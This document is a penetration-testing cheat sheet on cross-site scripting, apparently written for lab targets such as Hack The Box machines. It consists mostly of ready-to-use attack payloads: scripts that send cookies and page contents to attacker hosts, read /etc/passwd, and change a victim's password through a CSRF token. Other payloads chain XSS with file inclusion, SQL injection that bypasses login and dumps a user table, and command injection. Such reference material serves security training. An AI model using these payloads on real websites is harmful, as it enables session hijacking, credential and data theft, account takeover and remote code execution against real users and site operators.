---
description: >-
  As web applications grow in complexity and prevalence, so do their
  vulnerabilities. One of the most common types of web application
  vulnerabilities is Cross-Site Scripting (XSS).
---

# XSS

#### XSS payloads

```bash
# Check for xss file upload vulnerability
echo '<SCRIPT SRC=http://10.10.14.22:9090/test></SCRIPT>' > test2.png

# Load remote script
<script src="http://OUR_IP/script.js"></script>

# Send cookie
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>
<script>var i=new Image(); i.src="http://10.10.14.8/?cookie="+btoa(document.cookie);</script>

# Check with basic payload
<script>alert(window.origin)</script>

# HTML based
<img src="" onerror=alert(window.origin)>

# Change background color
<script>document.body.style.background = "#141d2b"</script>
```

#### Read files

```bash
# Read file
<script> x=new XMLHttpRequest; x.onload=function(){document.write(this.responseText)}; x.open('GET','file:///etc/passwd');x.send(); </script>

# Read file base64
<script> x=new XMLHttpRequest; x.onload=function(){document.write(btoa(this.responseText))}; x.open('GET','file:///etc/passwd');x.send(); </script>
```

#### Steal cookie

```javascript
<img src=x onerror="fetch('http://10.10.11.11/api/test').then(r => r.text()).then(data => fetch(`http://10.10.14.9/?data=${btoa(data)}`))">
```

```bash
# On target
<script src="http://mczen.xyz/exploit"></script>

# On attacker machine
window.location = "http://target.xzy/cookiestealer?c=" + document.cookie;
```

#### Exfiltrate data

{% hint style="warning" %}
GET parameter is bad practice due to the limited URL length, use POST with longer data.
{% endhint %}

Exfiltrate data from the victim's user context, here home.php. If the endpoint's fetch request does not include credentials remove `xhr.withCredentials = true;`.

Host script in script.js and get with

```html
<script src="http://10.10.10.10/script.js"></script>
```

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

#### Account takover

If updating password doesn not require old password we can change victims password by making a GET request where we get the CSRF token, extract it and POST request to change victim's password.

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);

// change PW
var csrf_req = new XMLHttpRequest();
var params = `username=admin&email=admin@vulnerablesite.htb&password=pwned&csrf_token=6079fb6a924fc0f3128e7d2014d0e7c5`;
csrf_req.open('POST', '/home.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

### <mark style="color:yellow;">XSS chained with LFI</mark>

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php?view=../../../../etc/passwd', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/lfi?r=" + btoa(xhr.responseText), false);
exfil.send();
```

### <mark style="color:yellow;">XSS chained with SQL injection</mark>

Using xxs we found an endpoint at http://internal.vulnerablesite.htb. First exfiltrate the data:

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://internal.vulnerablesite.htb/', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

#### Test for SQL injection

```javascript
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("'test")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

#### SQL authentication bypass

```javascript
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' OR '1'='1' -- -")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

#### Dump user table

```javascript
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT id,username,password,info FROM users-- -")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

### <mark style="color:yellow;">XSS chained RCE</mark>

If getting a response like `curl: (6) Could not resolve host: doesnotexist.htb` after data exfil RCE might be possible.

```javascript
var xhr = new XMLHttpRequest();
var params = `webapp_selector=${encodeURIComponent("| id")}`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```
